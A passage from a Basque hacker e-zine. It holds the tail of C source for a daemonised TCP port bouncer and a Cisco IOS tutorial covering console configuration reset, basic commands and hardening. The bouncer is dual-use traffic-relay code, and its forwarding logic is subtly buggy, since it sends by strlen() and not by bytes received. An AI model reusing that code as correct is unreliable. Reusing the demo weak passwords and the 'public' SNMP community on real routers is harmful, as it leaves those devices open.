                syslog(LOG_ERR, "Errorea prozesu sesio propioa eskatzerakoan.");
                exit(EXIT_FAILURE);
        }

        // Direktorioa aldatzen dugu
        if ( (chdir(rootdir)) < 0) {
                perror("Errorea / direktoriora aldatzerakoan.");
                syslog(LOG_ERR, "Errorea / direktoriora aldatzerakoan.");
                exit(EXIT_FAILURE);
        }

        // fitxategi baimenak berreskuratzen ditugu.
        umask(0);
       
        printf("Ponpakaria by niuBAI - Jakin ezine 7 - nire prozesu IDa[%d]\n",getpid());

        // Oinarrizko fitxategi deskriptoreak ixten ditugu. 
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);

        syslog(LOG_USER, "OK, Ponpakaria abian...");

        // Socketa sortzen dugu.
        if ((zerbitzarisocket = socket(AF_INET, SOCK_STREAM, 0) ) == -1 ) {
                syslog(LOG_ERR | LOG_USER, "Errorea socketa sortzerakoan: %s", strerror(errno));
                exit(EXIT_FAILURE);
        }

        // Socketaren helbide datuak ezarri (mota, portua, helbidea..)
        zerbitzari_helb.sin_family = AF_INET;
        zerbitzari_helb.sin_port = htons(portua);
        zerbitzari_helb.sin_addr.s_addr = htonl(INADDR_ANY);

        // Socketa bere helbideari
        if ( bind(zerbitzarisocket, (struct sockaddr*) &zerbitzari_helb, sizeof(struct sockaddr))  == -1 ) {
                syslog(LOG_ERR, "Errorea socketa sortzerakoan: %s", strerror(errno));
                exit(EXIT_FAILURE);
        }

        // Socketa entzuten jartzen dugu.
        if ( listen(zerbitzarisocket, 10) == -1 ) {
                syslog(LOG_ERR, "Errorea socketa listen moduan jartzerakoan %s", strerror(errno));
                exit(EXIT_FAILURE);
        }

        syslog(LOG_NOTICE | LOG_USER, "OK, ponpakaria %i portuan entzuten dago, eskaeren zain. ",PORTUA);


        // zerbitzariaren begizta nagusia
        while (1) {
                bezero_helb_tam = sizeof(struct sockaddr_in);

                // konexio bat onartzen dugu.
                        sock_tmp = accept(zerbitzarisocket, (struct sockaddr*) &bezero_helb, &bezero_helb_tam);

                // konexioan errorerik baldinbadago
                if ( sock_tmp == -1) {
                        syslog(LOG_ERR | LOG_USER, "Errorea konexioa onartzerakoan %s", strerror(errno));
                        exit(EXIT_FAILURE);
                }

                // Behin konexio onartu denean eskaerak bideratzen ditugu
		helburuarekin_komunikatu(sock_tmp, bezero_helb);


        }


        exit(EXIT_SUCCESS);

}//amaiera

// Bezeroaren eskaerari erantzuna eman.
int helburuarekin_komunikatu(int bezero_soketa, struct sockaddr_in bezero_helb) {

     int helburu_soketa;
     struct sockaddr_in helburu_helbidea;  // Helburu helbidearen socket informazia gordetzeko egitura
     struct hostent *host_entitatea;	// Helburu makinaren informazioa gordetzeko egitura
     int byte_kopurua = 0;
     char bufferra1[BUFFERMAX];
     char bufferra2[BUFFERMAX];
     long helburu_ip = inet_addr("127.0.0.1");
     char *erantzuna;
     int fl;

     syslog(LOG_USER, "OK, konexio berria sartu da %d",helburu_ip);

	if ((helburu_soketa = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                syslog(LOG_ERR | LOG_USER, "Errorea helburu soketa sortzerakoan %s", strerror(errno));
                return -1;
        }

        host_entitatea = gethostbyname("127.0.0.1");

        helburu_helbidea.sin_family = AF_INET;  // Soket familia
        helburu_helbidea.sin_port = htons(80);  // Helburu portua
        helburu_helbidea.sin_addr = *((struct in_addr *)host_entitatea->h_addr);

        syslog(LOG_USER, "OK, definizioa OK");

        if (connect(helburu_soketa, (struct sockaddr *)&helburu_helbidea,
                                              sizeof(struct sockaddr)) != 0) {
                syslog(LOG_ERR | LOG_USER, "Errorea helburu zerbitzariarekin konektatzerakoan %s", strerror(errno));
                return -1;
        }

        syslog(LOG_USER, "OK, konexioa OK");


        /****************** ADI DENOK *******************/
        // Hona hemen S/I ez blokeatzeko modua
        // soketak fitxategiak bezala tratatuko dira eta fcntl bitartez
        // blokeaezinak izango dira:

        fl = fcntl(helburu_soketa, F_GETFL);
        fcntl(helburu_soketa, F_SETFL, O_NONBLOCK);

        fl = fcntl(bezero_soketa, F_GETFL);
        fcntl(bezero_soketa, F_SETFL, O_NONBLOCK);


        // Hona hemen bouncer xinpleena: soket batetik datuak jaso eta datuak
        // zerbitzarira berbidaltzen bitu. Erantzunarekin berdin egiten du.
        while (1) {

           // Helburu zerbitzaritik datuak jaso badira...
           if ((byte_kopurua = recv(helburu_soketa, bufferra1, BUFFERMAX-1, 0)) > 0) {

              // ...erantzuna jatorri  bezerora bidaltzen da
              if (send(bezero_soketa, bufferra1, strlen(bufferra1),0) == -1 ) {
                syslog(LOG_ERR, "Errorea datuak zerbitzariari bidaltzerakoan %s", strerror(errno));
                errno = 0;
              }

           } else { // ez da daturik irakurri. 
              if (byte_kopurua == 0) { // zerbitzariak konexioa itxi badu bagoaz
                      syslog(LOG_USER, "Ez da daturik irakurri zerbitzarian");
                      break;
              }
           }	


           // Jatorri bezerotik datuak jaso badira...
           if ((byte_kopurua = recv(bezero_soketa, bufferra2, BUFFERMAX-1, 0)) > 0) {

              // ...helburu zerbitzarira datuak bidaltzen da
              if (send(helburu_soketa, bufferra2, strlen(bufferra2),0) == -1 ) {
                syslog(LOG_USER | LOG_ERR, "Errorea datuak zerbitzariari bidaltzerakoan %s", strerror(errno));
                errno = 0;
              }

           } else { // ez da daturik irakurri. Konexioa ixten dugu.
              if (byte_kopurua == 0) { // bezeroak konexioa itxi badu bagoaz
                      syslog(LOG_USER, "Ez da daturik irakurri bezerotik");
                      break;
              }
           }	

           // Bufferra hustutzen dugu: NULL karakterearekin betetzen da
           memset(&bufferra1,'\0',BUFFERMAX);
           memset(&bufferra2,'\0',BUFFERMAX);


      }//while

             syslog(LOG_USER, "Konexioa bukatu da");

     // Konexioa amaitutzat ematen dugu.
     close(bezero_soketa);
     close(helburu_soketa);

             syslog(LOG_USER, "Soketak itxi dira");

     return 0;
}

-------------------8<--------------------------------------------------------------

Zer ikusiko genuke pantailan?

Egikaripena:
jakin# ./ponpakaria
jakin# Ponpakaria by niuBAI - Jakin ezine 7 - nire prozesu IDa[4791]

Message from syslogd@jakin at Wed Jul 27 13:41:39 2005 ...
jakin ponpakaria[4791]: OK, Ponpakaria abian...

jakin#


Orain telneta proba daiteke:

Kasu honetan 6667 portura egiten diren eskaerak 80portura bideratuko dira.

jakin# telnet localhost 6667
Trying 127.0.0.1...

Message from syslogd@jakin at Wed Jul 27 13:43:10 2005 ...
jakin ponpakaria[4791]: OK, konexio berria sartu da 16777343
Connected to localhost.localdomain.
Escape character is '^]'.

Message from syslogd@jakin at Wed Jul 27 13:43:10 2005 ...
jakin ponpakaria[4791]: OK, definizioa OK

Message from syslogd@jff at Wed Jul 27 13:43:10 2005 ...
jakin ponpakaria[4791]: OK, konexioa OK
GET /
<HTML>
<HEAD>
        <TITLE>emaitza</TITLE>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
        <meta http-equiv="Cache-Control" content="no-cache">
<META HTTP-EQUIV=Refresh CONTENT="0; URL=http://jff.iber.lan/jffnms/">
</HEAD>

<BODY bgcolor=black>

<div align=center>
<font face="Arial, Helvetica" color="white">
<h1>index</h1>
</font>
</div>
</BODY>
</HTML>
Connection closed by foreign host.
jakin#
Message from syslogd@jakin at Wed Jul 27 13:43:12 2005 ...
jakin ponpakaria[4791]: Ez da daturik irakurri zerbitzarian

Message from syslogd@jakin at Wed Jul 27 13:43:12 2005 ...
jakin ponpakaria[4791]: Konexioa bukatu da

Message from syslogd@jakin at Wed Jul 27 13:43:12 2005 ...
jakin ponpakaria[4791]: Soketak itxi dira

jakin#



hurrena arte.

#define OF_THE_JEDI 1
return(OF_THE_JEDI);


             -niuBAI-
</0x05>





<0x06>
                    Router Ordorika: Cisco IOS sesioa
                 _______________________________________

SYN guztioi!

Duela gutxi Hakin9 aldizkarian Cisco IOSari buruz hitzegin zen. Beste edozein sistema eragilean bezala,
router baten besterik-ezeko konfigurazioa aldatzen ez bada sistema ez da batere seguru geratzen. Hakin9
Ciscoen ohizko ahuluneak aipatzen ziren; artikulu honetan Cisco IOSari buruz sarrera bat eman eta
routerra seguruago uzteko pausuak aurkeztuko ditut.

Nire lehen Cisco sesioa
-----------------------

Demagun Cisco 827 router bat gure eskuetara heltzen dela. Holako modeloa bat errez topa
daiteke enpresa ertain-txikietan. Cisco IOS eta agindu oinarrizkoenak ez dira aldatzen makina batetik bestera,
berdin da 8000 ala 2600 switcha izatea (tira, interfaze ezberdinak eta gaitasun handiagoak edukiko dituzte).

Bueno, ciscoa daukagu, eta litekeena bere pasahitza edo ip helbidea ez ezagutzea. Lasai! Cisco baten konfigurazioa
ezabatu dezakegu 0tik hasteko. Horretarako ezinbestekoa izango da kontsola kable bat lortzea: serie-rj45 
itsurakoa, urdin argia normalean.

Kable hori pc batera konektatu eta tera-term, hyperterminal, minicom edo nahi dugun programarekin
ciscora konektatuko gara. Konfigurazioan 9600 abiadura ezarri behar da. 

'Ciscoa piztu eta programan holako zerbait ikusiko dugu:
Karaktereak atera bezain laster 'Break' seinalea bidali behar dugu. Terminal programa bakoitzak
bere sistema dauka break bat bidaltzeko.

System Bootstrap, Version 12.1(1r)XB1, RELEASE SOFTWARE (fc1)
Copyright (c) 2000 by cisco Systems, Inc.
C827 platform with 16384 Kbytes of main memory

rommon 1 >
rommon 1 > confreg 0x2142


You must reset or power cycle for new config to take effect
rommon 2 > reset
System Bootstrap, Version 12.1(1r)XB1, RELEASE SOFTWARE (fc1)
Copyright (c) 2000 by cisco Systems, Inc.
C827 platform with 16384 Kbytes of main memory

program load complete, entry point: 0x80013000, size: 0x36509c
Self decompressing the image : #################################################
################################################################################
################################################################################
################################################################################
################################################################################
######### [OK]

              Restricted Rights Legend

Use, duplication, or disclosure by the Government is
subject to restrictions as set forth in subparagraph
(c) of the Commercial Computer Software - Restricted
Rights clause at FAR sec. 52.227-19 and subparagraph
(c) (1) (ii) of the Rights in Technical Data and Computer
Software clause at DFARS sec. 252.227-7013.

           cisco Systems, Inc.
           170 West Tasman Drive
           San Jose, California 95134-1706



Cisco Internetwork Operating System Software
IOS (tm) C820 Software (C820-Y6-M), Version 12.1(3)XG3, EARLY DEPLOYMENT RELEASE
 SOFTWARE (fc1)
TAC:Home:SW:IOS:Specials for info
Copyright (c) 1986-2000 by cisco Systems, Inc.
Compiled Wed 20-Dec-00 16:21 by detang
Image text-base: 0x80013170, data-base: 0x805E4528

CISCO C827 (MPC855T) processor (revision 0x501) with 15360K/1024K bytes of memory.
Processor board ID JAD04460G08 (789936287), with hardware revision 0000
CPU rev number 5
Bridging software.
1 Ethernet/IEEE 802.3 interface(s)
1 ATM network interface(s)
128K bytes of non-volatile configuration memory.
8192K bytes of processor board System flash (Read/Write)


         --- System Configuration Dialog ---

Would you like to enter the initial configuration dialog? [yes/no]: yes


At any point you may enter a question mark '?' for help.
Use ctrl-c to abort configuration dialog at any prompt.
Default settings are in square brackets '[]'.

Basic management setup configures only enough connectivity
for management of the system, extended setup will ask you
to configure each interface on the system

Would you like to enter basic management setup? [yes/no]: yes

Configuring global parameters:

  Enter host name [Router]: RouterOrdorika

  The enable secret is a password used to protect access to
  privileged EXEC and configuration modes. This password, after
  entered, becomes encrypted in the configuration.
  Enter enable secret: h4x0r

  The enable password is used when you do not specify an
  enable secret password, with some older software versions, and
  some boot images.
  Enter enable password: juakerra

  The virtual terminal password is used to protect
  access to the router over a network interface.
  Enter virtual terminal password: josua
  Configure SNMP Network Management? [yes]:
    Community string [public]:

Current interface summary

Any interface listed with OK? value "NO" does not have a valid configuration

Interface                  IP-Address      OK? Method Status                Protocol
ATM0                       unassigned      NO  unset  down                  down
Ethernet0                  unassigned      NO  unset  up                    down


Enter interface name used to connect to the
management network from the above interface summary:Ethernet0

Configuring interface Ethernet0:
  Configure IP on this interface? [yes]: bai
% Please answer 'yes' or 'no'.
  Configure IP on this interface? [yes]: yes
    IP address for this interface: 192.168.1.69
    Subnet mask for this interface [255.255.255.0] : 255.255.255.0
    Class C network is 192.168.1.0, 24 subnet bits; mask is /24

The following configuration command script was created:

hostname RouterOrdorika
enable secret 5 $1$Mwwb$1nx1qlpJNZJ0CtUQjsYHd0
enable password juakerra
line vty 0 4
password josua
snmp-server community public
!
no ip routing

!
interface ATM0
shutdown
no ip address
!
interface Ethernet0
no shutdown
ip address 192.168.1.69 255.255.255.0
!
end


[0] Go to the IOS command prompt without saving this config.
[1] Return back to the setup without saving this config.
[2] Save this configuration to nvram and exit.

Enter your selection [2]:2
Building configuration...
Use the enabled mode 'configure' command to modify this configuration.


Press RETURN to get started!

RouterOrdorika> 


Kitto!! routerra configuratuta daukagu. Konfigurazio hori egonkorra izateko zenbait pausu
jarraitu behar dira ezinbestez:

RouterOrdorika> enable
Password:

RouterOrdorika#configure memory

RouterOrdorika#
00:03:37: %SYS-5-CONFIG_I: Configured from memory by console
RouterOrdorika#
RouterOrdorika# configure terminal
RouterOrdorika(config)#config-register 0x2102
RouterOrdorika(config)# end
RouterOrdorika# write mem
Building configuration...
[OK]
RouterOrdorika#reload

00:06:11: %SYS-5-RELOAD: Reload requested
System Bootstrap, Version 12.1(1r)XB1, RELEASE SOFTWARE (fc1)
Copyright (c) 2000 by cisco Systems, Inc.
C827 platform with 16384 Kbytes of main memory

program load complete, entry point: 0x80013000, size: 0x36509c
Self decompressing the image : ###################.... bla-bla-bla


RouterOrdorika>
RouterOrdorika> enable
Password:

RouterOrdorika#
RouterOrdorika#show version
Cisco Internetwork Operating System Software
IOS (tm) C820 Software (C820-Y6-M), Version 12.1(3)XG3, EARLY DEPLOYMENT RELEASE
 SOFTWARE (fc1)
TAC:Home:SW:IOS:Specials for info
Copyright (c) 1986-2000 by cisco Systems, Inc.
Compiled Wed 20-Dec-00 16:21 by detang
Image text-base: 0x80013170, data-base: 0x805E4528

ROM: System Bootstrap, Version 12.1(1r)XB1, RELEASE SOFTWARE (fc1)
ROM: C820 Software (C820-Y6-M), Version 12.1(3)XG3, EARLY DEPLOYMENT RELEASE SOF
TWARE (fc1)

RouterOrdorika uptime is 10 minutes
System returned to ROM by power-on
System image file is "flash:c820-y6-mz.121-3.XG3.bin"

CISCO C827 (MPC855T) processor (revision 0x501) with 15360K/1024K bytes of memor
y.
Processor board ID JAD04460G08 (789936287), with hardware revision 0000
CPU rev number 5
Bridging software.
1 Ethernet/IEEE 802.3 interface(s)
1 ATM network interface(s)
128K bytes of non-volatile configuration memory.
8192K bytes of processor board System flash (Read/Write)

Configuration register is 0x2142


Oinarrizko konfigurazioa bat ikusiko dugu:

RouterOrdorika# 
RouterOrdorika# show run
Current configuration:
!
version 12.1
no service pad
service timestamps debug uptime
service timestamps log uptime
no service password-encryption
!
hostname RouterOrdorika
!
enable secret 5 $1$Mwwb$1nx1qlpJNZJ0CtUQjsYHd0
enable password juakerra
!
!
!
!
!
ip subnet-zero
no ip routing
!
!
!
nterface Ethernet0
 ip address 192.168.1.69 255.255.255.0
 no ip route-cache
!
interface ATM0
 no ip address
 no ip route-cache
 no atm ilmi-keepalive
 bundle-enable
 dsl operating-mode auto
!
ip classless
no ip http server
!
snmp-server engineID local 000000090200000427FCD935
snmp-server community public RO
!
line con 0
 transport input none
 stopbits 1
line vty 0 4
 password josua
 login
!
scheduler max-task-time 5000
end


RouterOrdorika# 
RouterOrdorika# write mem
Building configuration...
[OK]
RouterOrdorika# reload
Proceed with reload? [confirm]

00:13:03: %SYS-5-RELOAD: Reload requested

ystem Bootstrap, Version 12.1(1r)XB1, RELEASE SOFTWARE (fc1)
Copyright (c) 2000 by cisco Systems, Inc.
C827 platform with 16384 Kbytes of main memory

program load complete, entry point: 0x80013000, size: 0x36509c
Self decompressing the image : ###################.... bla-bla-bla


     ______________________                 ____
    /                      \               /    \
>--<   Cisco sesio bat      >-------------<      >-------------
    \______________________/               \____/

Goazen sesio bati hasiera ematera, ethernet bidez.
telnet 192.168.1.69

User Access Verification

Password:
RouterOrdorika>enable
Password:
RouterOrdorika#

Laguntza
--------

Laguntza lortzeko ? jarri

RouterOrdorika#?

Exec commands:
  <1-99>           Session number to resume
  access-enable    Create a temporary Access-List entry
  access-profile   Apply user-profile to interface
  access-template  Create a temporary Access-List entry
  archive          manage archive files
  cd               Change current directory
--More--

Bestalde agindu baten aukerak ezagutzeko ? sar daiteke ala <Tab>ari eman.

RouterOrdorika#show ?
  access-expression    List access expression
  access-lists         List access lists
  accounting           Accounting data for active sessions
  adjacency            Adjacent nodes
--More--

Fitxategi sistematik mugitzen
-----------------------------

Fitxategi sistema ezagutu dezakegu. Bai, IOSak fitxategi sistema eta unitate ezberdinak dauzka.
Normalean memoria, flash memoria, .. holako sistemak dira.

RouterOrdorika#dir
Directory of flash:/

  1  -rw-     3559864              <no date>  c820-y6-mz.121-3.XG3.bin

8388608 bytes total (4828680 bytes free)
RouterOrdorika#
RouterOrdorika#cd ?
  flash:   Directory name
  null:    Directory name
  nvram:   Directory name
  system:  Directory name
  xmodem:  Directory name
  ymodem:  Directory name
  <cr>

flash: gunean sistema eragilea edo IOSa gordetzen da.
nvram: gunean konfigurazioa gordetzen da.
system: unix-eko proc baten antzekoa litzateke

running-config eta system-config: lehenengoa momentuko konfigurazioa da,
bigarrena sistema hasieratzen denean kargatzen dena. Konfigurazio aldatzen
denean hurrengo hasieraketan gordeta egoteko "write mem" egikaritu behar dugu.
Horrek aldaketak gordeko ditu startup-config-en.

RouterOrdorika#cd 
RouterOrdorika#cd system:
RouterOrdorika#dir
Directory of system:/

  2  dr-x           0              <no date>  memory
  1  -rw-         764              <no date>  running-config
  9  dr-x           0              <no date>  vfiles

No space information available



Fitxategien edukina
-------------------

RouterOrdorika#more running-config
!
version 12.1
no service pad
service timestamps debug uptime
service timestamps log uptime
no service password-encryption
!
hostname RouterOrdorika

"q" bitartez moztu
RouterOrdorika#more running-config
RouterOrdorika#cd memory
RouterOrdorika#dir
Directory of system:/memory/

  7  -r--      480708              <no date>  bss
  6  -r--     3003320              <no date>  data
  8  -r--     6066524              <no date>  heap
  3  -r--     1048576              <no date>  iomem
  4  -r--    15728640              <no date>  main
  5  -r--     6099896              <no date>  text

No space information available
RouterOrdorika#
RouterOrdorika#cd memory
RouterOrdorika#dir
Directory of system:/memory/

  7  -r--      480708              <no date>  bss
  6  -r--     3003320              <no date>  data
  8  -r--     6066524              <no date>  heap
  3  -r--     1048576              <no date>  iomem
  4  -r--    15728640              <no date>  main
  5  -r--     6099896              <no date>  text

No space information available
RouterOrdorika#cd ..
RouterOrdorika#dir
Directory of system:/

  2  dr-x           0              <no date>  memory
  1  -rw-         764              <no date>  running-config
  9  dr-x           0              <no date>  vfiles

No space information available
RouterOrdorika#cd vfiles
RouterOrdorika#dir
Directory of system:/vfiles/

 12  -r--           0              <no date>  tmasinfo
 10  -r--           0              <no date>  tmstats_ascii
 11  -r--           0              <no date>  tmstats_binary

No space information available

RouterOrdorika#more tmstats_ascii
VERSION 1|ADDR 192.168.1.69|AGGREGATION TrafficMatrix.ascii|SYSUPTIME 337755|routerUTC 2940270558|NTP unsynchronized|DURATION 0|

RouterOrdorika#

Non gauden jakiteko pwd erabil dezakegu, unixen lez.

RouterOrdorika#pwd
system:/vfiles/
RouterOrdorika#

RouterOrdorika#cd nvram:
RouterOrdorika#dir
Directory of nvram:/

  1  -rw-         777              <no date>  startup-config
  2  ----          25              <no date>  private-config

131072 bytes total (130295 bytes free)
RouterOrdorika#more private-config
%Error opening nvram:private-config (Permission denied)
RouterOrdorika#


Erlojua ezartzen
----------------

RouterOrdorika#clock set 22:06:4 3 FEB 2005
RouterOrdorika#sh clock
22:06:06.339 UTC Thu Feb 3 2005
RouterOrdorika#


Pasahitza aldatzen
------------------

Enable pasahitza aldatzen:

RouterOrdorika#conf
Configuring from terminal, memory, or network [terminal]?
RouterOrdorika(config)#enable secret 0 supergakoa
RouterOrdorika(config)#end

Mezuak bidaltzen
----------------

Erabiltzaile bat baino gehiago balndibadago, mezuak bidali daitezke
unixeko writearekin bezala.

RouterOrdorika#systat
    Line       User       Host(s)              Idle       Location
*  1 vty 0                idle                 00:00:00 192.168.1.243
   2 vty 1                idle                 00:00:11 192.168.1.243

  Interface  User      Mode                     Idle Peer Address

RouterOrdorika#
RouterOrdorika#send vty 1
Enter message, end with CTRL/Z; abort with CTRL/C:
que pasa neeeen
^Z
Send message? [confirm]
RouterOrdorika#


Besteak holako zerbait ikusiko du:


***
***
*** Message from tty1 to tty2:
***
que pasa neeeen




Arazketa
--------

Interesgarria izan daiteke routerran erroreak topatzeko. Arazketa zehatza edo
orokorra izan daiteke (snmp, interfazeak, tunelak,...)


RouterOrdorika#debug all
This may severely impact network performance. Continue? [confirm]
All possible debugging has been turned on

Interesgarria ere terminal aginduen bitartez arazketa mezuak ikustea:
RouterOrdorika#terminal monitor
RouterOrdorika#


RouterOrdorika#undebug all
All possible debugging has been turned off
RouterOrdorika#


Erabiltzaileak
--------------

RouterOrdorika#sh users wide
    Line       User       Host(s)              Idle       Location
*  1 vty 0                idle                 00:00:00 192.168.1.243

  Interface  User      Mode                     Idle Peer Address

RouterOrdorika#
RouterOrdorika#sh users all
    Line       User       Host(s)              Idle       Location
   0 con 0                                     00:00:00
*  1 vty 0                idle                 00:00:00 192.168.1.243
   2 vty 1                                     00:00:00
   3 vty 2                                     00:00:00
   4 vty 3                                     00:00:00
   5 vty 4                                     00:00:00

  Interface  User      Mode                     Idle Peer Address

RouterOrdorika#


Memoriaren egoera
-----------------


RouterOrdorika#show processes memory
Total: 6066524, Used: 2609592, Free: 3456932
 PID TTY  Allocated      Freed    Holding    Getbufs    Retbufs Process
   0   0      65536       1808    2055300          0          0 *Init*
   0   0        628     541392        628          0          0 *Sched*
   0   0    5848876    2804848       1096     595904          0 *Dead*
   1   0        276        276       3844          0          0 Load Meter
   3   0          0          0       6844          0          0 Check heaps
   4   0      20248          0      27092          0          0 Chunk Manager
   5   0         96          0       6940          0          0 Pool Manager
   6   0        276        276       6844          0          0 Timers
--More--


RouterOrdorika#sho memory
                Head    Total(b)     Used(b)     Free(b)   Lowest(b)  Largest(b)
Processor   80936EA4     6066524     2614004     3452520     3260524     3259120
      I/O     F00000     1048644      620808      427836      427836      427260




          Processor memory

 Address  Bytes Prev.    Next     Ref  PrevF   NextF   Alloc PC  What
80936EA4   1460 0        80937484   1                  800F0684  List Elements
80937484   2960 80936EA4 80938040   1                  800F06B4  List Headers
80938040   9000 80937484 8093A394   1                  8010AF04  Interrupt Stack
8093A394     44 80938040 8093A3EC   1                  805E0FFC  *Init*
8093A3EC   4104 8093A394 8093B420   1                  80073968  TTY data
8093B420   2000 8093A3EC 8093BC1C   1                  80077144  TTY Input Buf
--More--



Prozesuen egoera
----------------

RouterOrdorika#show processes cpu
CPU utilization for five seconds: 2%/1%; one minute: 4%; five minutes: 3%
 PID  Runtime(ms)  Invoked  uSecs    5Sec   1Min   5Min TTY Process
   1          28     72501      0   0.00%  0.00%  0.00%   0 Load Meter
   3     4641936    257744  18009   0.00%  1.49%  1.34%   0 Check heaps
   4           0         1      0   0.00%  0.00%  0.00%   0 Chunk Manager
   5           0         1      0   0.00%  0.00%  0.00%   0 Pool Manager
   6           0         2      0   0.00%  0.00%  0.00%   0 Timers
   7           0         2      0   0.00%  0.00%  0.00%   0 Serial Backgroun
   8        1336     10582    126   0.00%  0.00%  0.00%   0 ARP Input
   9           0         2      0   0.00%  0.00%  0.00%   0 DDR Timers
  10           0         2      0   0.00%  0.00%  0.00%   0 Dialer event
--More--



RouterOrdorika#show subsys

                    Class         Version
ether               Kernel      1.000.001
serial              Kernel      1.000.001
nvram_common        Kernel      1.000.001
static_map          Kernel      1.000.001
if_list             Kernel      1.000.001
ifs                 Kernel      1.000.001
infs_image_ascii     Library     1.000.001
ifs_image_aout      Library     1.000.001
ifs_image_compress  Library     1.000.001
--More--


Ethernet interfazea
-------------------

Ethernet interfazean ip bat ezartzea erreza da.

RouterOrdorika#conf term
Enter configuration commands, one per line.  End with CNTL/Z.
RouterOrdorika(config)#interface ethernet 0
RouterOrdorika(config-if)#ip address 192.168.1.69 255.255.255.0
RouterOrdorika(config-if)#end
RouterOrdorika#

Router baten interfazeak konfiguratzeko pauso berdinak jarraitzen dira;
konfigurazio moduan sartu eta interfaze zehatzan sartzen gara.

Dns zerbitzariak sar ditzakegu.

RouterOrdorika#conf term
Enter configuration commands, one per line.  End with CNTL/Z.
RouterOrdorika(config)#ip name-server 62.151.2.8 62.151.8.100
RouterOrdorika(config)#end
RouterOrdorika#

Bere egoera ezagutzeko probatu: show interfaces ethernet 0
eta show controller ethernet 0


Konsolatik mugitzen
-------------------

Aginduak egikaritzean baliogarriak izan daitezkeen konbinaketak:

Mugitzeko
<Ctrl-B>: atzera karaktere bat
<Ctrl-F>: atzera karaktere bat
<Esc-B>: atzera hitz bat
<Esc-F>: atzera hitz bat
<Ctrl-A>: lerro hasierara
<Ctrl-E>: lerro bukaerara

Ezabatzeko
<Ctrl-H>, <Backspace>, <Delete> : karaktere bat ezabatu atzeruntz
<Ctrl-D> : karaktere bat ezabatu aurrerantz
<Ctrl-W>, <Esc-Delete> : hitz bat ezabatu atzerantz
<Esc-D>: hitz bat ezabatu aurrerantz
<Ctrl-U>, <Ctrl-X> : lerroa ezabatu atzeruntz
<Ctrl-K> : lerroa ezabatu aurrerantz

Agindu historikoa
<Ctrl-P>: agindu historikoa gora
<Ctrl-N>: agindu historikoa behera

<Ctrl-Z>: konfigurazio modutik ateratzeko

Bestelakoak
<Ctrl-Y>: ezabatu dugun azkenekoa berreskuratzeko




     ______________________                 ____
    /                      \               /    \
>--<   Router seguruagoa    >-------------<      >-------------
    \______________________/               \____/

Cisco segurtasunari buruz literatur mordoa dago, lehen sesio honetan oinarrizko segurtasun
neurri batzuk aurkeztuko ditugu. Hasieran aipaturiko Hakin9-ren artikuluan agertzen diren
zenbait ahulune desagertaraziko ditugu honekin. Pausu sinpleak eta begibistakoak dira.

ACLak erabiltzen ikasi behar da.

0.- Pasahitza onak sartu.


Zifraketa jartzea komeni da:
RouterOrdorika#conf term
Enter configuration commands, one per line.  End with CNTL/Z.
RouterOrdorika(config)#service password-encryption
RouterOrdorika(config)#end


Horrela line vty-n gakoa zifratuta agertuko da:

line vty 0 4
 access-class 1 in
 password 7 1044060A1016
 login

Gero enable pasahitz on bat aukeratu
RouterOrdorika(config)#enable secret 0 superpasahitza

Eta enable pasahitzaren faltan "enable password" bat sartzen da
RouterOrdorika(config)#enable password 0 bestepasahitza

enable-secret eta enable-password ezberdinak izan behar dute. Enable-password-ak baliogarria
da enable-secret bat jarri ez denean.


1.- http zerbitzaria kendu.


http zerbitzuak ahulune handiak ditu. Erabiltzen ez bada, hobe kentzea.

RouterOrdorika#conf term
Enter configuration commands, one per line.  End with CNTL/Z.
RouterOrdorika(config)#no ip http server
RouterOrdorika(config)#end
RouterOrdorika#


2.- snmp zerbitzua kendu. Beharrezkoa izanez gero filtratu eta besterik ezeko komunitatea aldatu. 

SNMPa kentzeko:
RouterOrdorika(config)#no snmp-server

ACLkin egin daiteke modu ezberdinetan. Demagun konfidantzazko ip bati baimena eman nahi diogula,
baina besteei ez.


SNMPari atzipen orokorra Kentzeko:
ACL bat Ethernet interfazean aplikatuko dugu
RouterOrdorika(config)#
RouterOrdorika(config)#access-list 101 permit ip host 192.168.1.243 any
RouterOrdorika(config)#access-list 101 permit icmp host 192.168.1.243 any
RouterOrdorika(config)#access-list 101 deny   tcp any host 192.168.1.69 eq telnet
RouterOrdorika(config)#access-list 101 deny   udp any host 192.168.1.69 eq snmp
RouterOrdorika(config)#interfacce Ethernet 0
RouterOrdorika(config-if)#ip access-group 101 in

Beste modu zehatzagoa:


3.- pinga kendu.

Ethernet interfazean aplikatuko dugu
Horretarako icmp protokoloaren inguruko ACLak sortu behar dira


4.- 23 portua babestu.

Access-list simplea (1-100era) erabiliko dugu eta vty 0 4en aplikatuko da.
Kasu honetan bakarrik 192.168.1.243 helbidetik konektatu ahal izango gara.

RouterOrdorika#conf term
Enter configuration commands, one per line.  End with CNTL/Z.
RouterOrdorika(config)#access-list 10 permit 192.168.1.243
RouterOrdorika(config)#access-list 10 deny any
RouterOrdorika(config)#line vty 0 4
RouterOrdorika(config-line)#acc
RouterOrdorika(config-line)#access-class 10 in
RouterOrdorika(config-line)#exit
RouterOrdorika(config)#end


5.- Bestelako zerbitzuak kendu:

RouterOrdorika#conf term
Enter configuration commands, one per line.  End with CNTL/Z.
RouterOrdorika(config)#no ser
RouterOrdorika(config)#no service finger
RouterOrdorika(config)#no service tcp-small-servers
RouterOrdorika(config)#no service udp-small-servers


6.- Bestelako konfigurazioa gomendagarriak

no ip source-route
no ip proxy-arp

-IP berbideraketak ekiditeko

interface Ethernet 0
no ip redirects


interface Ethernet 0
no ip mroute-cache

-Cisco cdp protokoloa kendu
no cdp run

-SMURF moduko erasoak ekiditeko
no ip directed-broadcast

-Pakete ezezagunak pikutara bidali
interface null0
no ip unreachables


Eta ez ahaztu!!!
RouterOrdorika#write mem

IOS eguneratzea ere komeni da. Ciscok ahulune pila dauzka, eta berriak ateratzen
dira behin eta berriz. Oso fidagarriak ez badira ere, emulen IOS zehatzak topa daitezke.



+------------------------+
| Cisco Agindu laburpena |
+------------------------+

#show : egoerak, konfigurazioak erakusteko agindu orokorra
  
#clear : egoerak, kontagailuak, e.a. hustutzeko agindu orokorra
#pwd : momentuko kokapena jakiteko fitxategi sisteman
#dir : fitxategiak ikusteko
#cd : direktorioa aldatzeko
#more: fitxategi baten edukina ezagutzeko
#copy : fitxategiak kopiatzeko
#delete : fitxategiak ezabatzeko
#ping : ping
#telnet : telnet
#traceroute : traceroute
#reload : sistema hasieratzeko
#rsh : urruneko makina batean aginduak egikaritzeko
#enable : root moduan sartzeko
